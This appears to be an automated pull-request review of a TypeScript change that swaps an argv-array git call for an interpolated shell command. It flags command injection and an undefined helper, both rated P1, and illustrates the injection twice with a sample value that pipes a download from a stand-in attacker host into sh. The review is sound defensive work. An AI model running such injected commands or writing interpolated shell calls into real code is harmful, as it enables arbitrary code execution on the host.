## Overview:

This PR changes `showBranch` in `src/git.ts` from argument-based `execFileAsync` invocation to constructing a shell command string and calling `execAsync`. The stated intent is to refine behavior while preserving the existing contract.

Specialist review should scrutinize shell interpolation of `branch`, availability/imports for `execAsync`, and whether the changed execution semantics preserve error handling and argument behavior.

## Strengths:

- Keeps the exported function name and parameter shape unchanged.
- Limits the implementation change to a single focused function.

resolvedReview.overview:
This PR rewrites the body of `showBranch` in `src/git.ts`, replacing an argv-array spawn (`execFileAsync("git", ["show", branch])`) with an interpolated shell command string (`git show ${branch}`) executed via `execAsync`. The stated intent is to "refine behavior while preserving existing contracts" — but the change does the opposite on two fronts: it breaks the function outright (the helper it calls does not exist) and it replaces an injection-safe spawning contract with a shell-interpreted one.

The exported signature is unchanged and the change is small and focused, but both modified lines introduce real defects that should be fixed before merge.

findings.title: [P1] Restore the argv-array spawn instead of interpolating `branch` into a shell command
findings.body: The diff replaces `execFileAsync("git", ["show", branch])` — which passes `branch` as a single argv element with no shell interpretation — with a command string built by template interpolation. Once `execAsync` is defined as the shell-exec wrapper its name (and the prior `execFileAsync` promisified-helper pattern) implies, any caller-influenced value reaches `/bin/sh`: a ref name like `release;id` executes as `git show release; id`, and input such as `main; curl attacker.example/payload | sh` runs arbitrary commands with the process's privileges. Semicolons and many metacharacters are legal in Git ref names, so this is not limited to pathological input; benign names can also be mis-tokenized. It can additionally corrupt the error contract — an injected suffix can make the promise resolve even when `git show` itself fails. Keep the argv-array form (`execFile("git", ["show", branch])`) so the value is never shell-interpreted.

findings.title: [P1] Define or import `execAsync` — it resolves to nothing
findings.body: The new line `return execAsync(command)` references a name that is neither imported nor declared: the module's only import is `execFile` from `node:child_process`, and the repository contains no other file that could define or re-export `execAsync`. Under TypeScript this fails compilation (`TS2304: Cannot find name 'execAsync'`); in plain JavaScript every call to `showBranch` rejects with `ReferenceError: execAsync is not defined`, so the exported function is uncallable as shipped. The lingering `execFile` import suggests the intended promisified helper (e.g. `promisify(execFile)`) was never created — note the base branch's `execFileAsync` reference had the same gap, so either define the helper here or call a real API.

# PR Review

**Verdict:** request_changes

## Overview

This PR rewrites the body of `showBranch` in `src/git.ts`, replacing an argv-array spawn (`execFileAsync("git", ["show", branch])`) with an interpolated shell command string (`git show ${branch}`) executed via `execAsync`. The stated intent is to "refine behavior while preserving existing contracts" — but the change does the opposite on two fronts: it breaks the function outright (the helper it calls does not exist) and it replaces an injection-safe spawning contract with a shell-interpreted one.

The exported signature is unchanged and the change is small and focused, but both modified lines introduce real defects that should be fixed before merge.

## Verification

Verification did not run: no user-level `verificationBaselines` are configured, so the trusted baseline tool reported verification disabled (`action: list` returned no applicable names). Note: had one been configured, it would execute this PR's code unsandboxed (supervised only at the original POSIX process group level); an external sandbox/container wrapper is recommended for untrusted PRs. All findings below were instead confirmed by direct source inspection of the complete diff and the checked-out repository.

## Findings

### [P1] Restore the argv-array spawn instead of interpolating `branch` into a shell command
**Severity:** P1
**Rationale:** The diff replaces `execFileAsync("git", ["show", branch])` — which passes `branch` as a single argv element with no shell interpretation — with a command string built by template interpolation. Once `execAsync` is defined as the shell-exec wrapper its name (and the prior `execFileAsync` promisified-helper pattern) implies, any caller-influenced value reaches `/bin/sh`: a ref name like `release;id` executes as `git show release; id`, and input such as `main; curl attacker.example/payload | sh` runs arbitrary commands with the process's privileges. Semicolons and many metacharacters are legal in Git ref names, so this is not limited to pathological input; benign names can also be mis-tokenized. It can additionally corrupt the error contract — an injected suffix can make the promise resolve even when `git show` itself fails. Keep the argv-array form (`execFile("git", ["show", branch])`) so the value is never shell-interpreted.
**Location:** `src/git.ts:15-16 RIGHT`

### [P1] Define or import `execAsync` — it resolves to nothing
**Severity:** P1
**Rationale:** The new line `return execAsync(command)` references a name that is neither imported nor declared: the module's only import is `execFile` from `node:child_process`, and the repository contains no other file that could define or re-export `execAsync`. Under TypeScript this fails compilation (`TS2304: Cannot find name 'execAsync'`); in plain JavaScript every call to `showBranch` rejects with `ReferenceError: execAsync is not defined`, so the exported function is uncallable as shipped. The lingering `execFile` import suggests the intended promisified helper (e.g. `promisify(execFile)`) was never created — note the base branch's `execFileAsync` reference had the same gap, so either define the helper here or call a real API.
**Location:** `src/git.ts:16 RIGHT`

## Lane completeness

All requested lanes completed (overview, conventions-maintainability, correctness, correctness-contracts, security-performance, performance-resources; 6/6 semantically complete, none partial/failed).

## Strengths and notes

- Keeps the exported function name, parameter shape, and async signature unchanged, so callers need no updates.
- The change is contained to a single small function, which makes the fix straightforward: restore the argv-array call and use a defined (promisified) `execFile` helper.
- **Correctness:** the function currently cannot execute at all (undefined identifier), and once that is fixed the shell-string form introduces injection.
- **Security:** this is a security regression — the pre-change argv-array contract is the documented safe pattern for passing untrusted values to subprocesses; the interpolated command string removes that guarantee.
- **Performance:** no resource, cleanup, or scalability regressions identified in the changed lines.
